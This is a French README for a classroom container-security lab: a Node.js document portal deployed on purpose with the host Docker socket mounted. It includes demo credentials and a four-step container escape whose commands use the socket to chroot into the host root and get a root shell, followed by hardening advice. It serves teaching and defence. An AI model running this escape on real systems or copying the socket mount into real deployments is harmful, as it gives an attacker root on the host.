# Internal Document Portal (IDP)

> Projet pédagogique — TP6 : **Sécurité des conteneurs / Container Escape Docker**.
>
> **Avertissement** : ce projet contient **volontairement** une mauvaise configuration
> Docker afin de démontrer une attaque de type *Container Escape*. **Ne JAMAIS**
> déployer cette configuration en production.

---

## 1. Présentation

Internal Document Portal simule une plateforme interne d'entreprise permettant :

- l'authentification des employés ;
- la consultation de documents internes ;
- la lecture du contenu d'un document ;
- l'upload de nouveaux documents.

L'application est déployée via Docker / Docker Compose **avec une vulnérabilité
volontaire** : le socket Docker de l'hôte (`/var/run/docker.sock`) est monté dans
le conteneur, ce qui permet une évasion vers la machine hôte.

---

## 2. Stack technique

| Élément              | Techno                                |
| -------------------- | ------------------------------------- |
| Backend              | Node.js 20 + Express 4                |
| Frontend             | HTML / CSS / JS vanilla               |
| Base de données      | JSON (fichiers `src/data/*.json`)     |
| Upload               | multer                                |
| Conteneurisation     | Docker + Docker Compose               |
| Système              | Windows 11 + Docker Desktop / WSL2    |

---

## 3. Structure du projet

```
TP6/
├── PRD.md                       # Cahier des charges initial
├── README.md                    # Ce fichier
├── package.json
├── server.js                    # Point d'entrée Express
├── Dockerfile                   # Image vulnérable (root + docker CLI)
├── docker-compose.yml           # Déploiement vulnérable (docker.sock)
├── docker-compose.secure.yml    # Version DURCIE (contre-mesures)
├── .dockerignore
├── public/                      # Frontend statique (sidebar + dashboard SPA)
│   ├── index.html               # Page de login (sélection rapide des comptes démo)
│   ├── dashboard.html           # Sidebar + 4 vues (Documents / Upload / System / Status)
│   ├── style.css                # Design system (Plus Jakarta Sans + JetBrains Mono)
│   ├── app.js
│   └── dashboard.js
├── src/
│   ├── data/
│   │   ├── users.json           # Comptes de démo
│   │   └── documents.json       # Métadonnées documents
│   ├── middleware/
│   │   └── auth.js              # Middleware token + rôle
│   └── routes/
│       ├── auth.js              # POST /api/login
│       ├── files.js             # GET /api/files, GET /api/files/:id
│       ├── upload.js            # POST /api/upload, GET /api/uploads
│       ├── status.js            # GET /api/status
│       └── admin.js             # GET /api/admin/system  (interroge docker.sock)
├── documents/                   # Documents internes (texte)
├── uploads/                     # Stockage des fichiers téléversés
└── docs/
    ├── ATTACK_SCENARIO.md       # Scénario d'évasion pas-à-pas (cas réel)
    ├── HARDENING.md             # Contre-mesures et bonnes pratiques
    ├── SCREENSHOTS_GUIDE.md     # Liste ordonnée des captures pour le rapport
    └── screenshots/             # Dossier où déposer les captures
```

---

## 4. Démarrage rapide

### 4.1 En local (sans Docker)

```bash
npm install
npm start
```

L'application est ensuite accessible sur [http://localhost:3000](http://localhost:3000).

### 4.2 Avec Docker Compose (configuration vulnérable — pour la démo)

```bash
docker compose up --build
```

> Sous Windows + Docker Desktop : exécuter la commande dans **WSL2 Ubuntu**
> pour que le montage `/var/run/docker.sock` fonctionne correctement.

### 4.3 Avec Docker Compose (configuration durcie)

```bash
docker compose -f docker-compose.secure.yml up --build
```

---

## 5. Comptes de démonstration

| Email                       | Mot de passe   | Rôle      |
| --------------------------- | -------------- | --------- |
| employee@company.local      | password123    | employee  |
| hr@company.local            | hr2024         | hr        |
| admin@company.local         | admin123       | admin     |

---

## 6. Endpoints API

| Méthode | Endpoint              | Auth         | Description                                    |
| ------- | --------------------- | ------------ | ---------------------------------------------- |
| GET     | `/api/status`         | non          | État de l'API                                  |
| POST    | `/api/login`          | non          | Authentification (retourne un token)           |
| GET     | `/api/files`          | oui          | Liste des documents internes                   |
| GET     | `/api/files/:id`      | oui          | Lecture d'un document                          |
| POST    | `/api/upload`         | oui          | Upload d'un document (`document=...`)          |
| GET     | `/api/uploads`        | oui          | Liste des fichiers téléversés                  |
| GET     | `/api/admin/system`   | oui (admin)  | **System Health** : interroge Docker via socket|

> **À propos de `/api/admin/system`** : cette route illustre une
> *mauvaise pratique réelle et fréquente* (cf. Portainer, Watchtower, CI runners…)
> qui consiste à monter `/var/run/docker.sock` dans l'app pour récupérer l'état
> des conteneurs. Voir [`docs/ATTACK_SCENARIO.md`](docs/ATTACK_SCENARIO.md).

### Exemple — login + lecture d'un document

```bash
# 1) Authentification
TOKEN=$(curl -s -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"employee@company.local","password":"password123"}' \
  | jq -r .token)

# 2) Liste des documents
curl -s http://localhost:3000/api/files -H "Authorization: Bearer $TOKEN"

# 3) Lecture du document #1
curl -s http://localhost:3000/api/files/1 -H "Authorization: Bearer $TOKEN"
```

---

## 7. Démonstration de la vulnérabilité (Container Escape)

Voir le document détaillé [`docs/ATTACK_SCENARIO.md`](docs/ATTACK_SCENARIO.md).

Résumé en 4 étapes :

1. L'attaquant obtient un shell dans le conteneur applicatif :
   ```bash
   docker exec -it idp-app bash
   ```
2. Il découvre `/var/run/docker.sock` monté dans le conteneur.
3. Il pilote le Docker Engine de l'**hôte** depuis l'intérieur :
   ```bash
   docker -H unix:///var/run/docker.sock ps
   ```
4. Il lance un conteneur privilégié qui monte la racine de l'hôte (`/`) :
   ```bash
   docker -H unix:///var/run/docker.sock run --rm -it \
     -v /:/host alpine chroot /host sh
   ```
   → **Container Escape** : l'attaquant a un shell root sur la machine hôte.

---

## 8. Contre-mesures

Voir [`docs/HARDENING.md`](docs/HARDENING.md). Les principales mesures :

- ne **jamais** monter `/var/run/docker.sock` dans un conteneur applicatif ;
- exécuter les conteneurs en **utilisateur non-root** ;
- `cap_drop: [ALL]` + `security_opt: [no-new-privileges]` ;
- `read_only: true` + tmpfs ;
- mode **rootless** Docker côté hôte ;
- profils **AppArmor / seccomp** ;
- scan régulier des images (Trivy, Grype) ;
- segmentation réseau ;
- principe du moindre privilège.

---

## 9. Livrables

- [x] Code source de l'API Node.js
- [x] Frontend HTML/CSS
- [x] Dockerfile + docker-compose vulnérable
- [x] docker-compose.secure.yml (version durcie)
- [x] Scénario d'attaque détaillé
- [x] Documentation hardening
- [ ] Captures d'écran (à produire lors de la démo)
- [ ] Présentation PowerPoint (à produire)

---

## 10. Avertissement légal

Ce projet est strictement pédagogique. Les techniques d'évasion présentées ne
doivent être exécutées **que** dans un environnement de laboratoire que vous
contrôlez. Toute exploitation sur un système tiers sans autorisation explicite
est illégale.
